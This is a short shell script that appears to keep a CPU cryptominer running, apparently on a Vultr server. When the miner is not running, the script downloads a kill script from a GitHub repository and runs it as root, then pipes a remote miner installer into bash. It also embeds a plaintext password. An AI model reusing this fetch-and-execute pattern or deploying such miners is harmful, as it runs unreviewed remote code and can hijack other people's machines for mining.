#!/bin/sh
password="danielchau@123#"
if pgrep cpuminer-sse2 >/dev/null
then
  echo "cpuminer-sse2 is running."
else
  echo "cpuminer-sse2 isn't running"
  wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
  chmod +x /root/kill_miner.sh
  ./kill_miner.sh
  sleep 3
  bash <(curl -s 'https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/minerVish_Vultr.sh')
fi
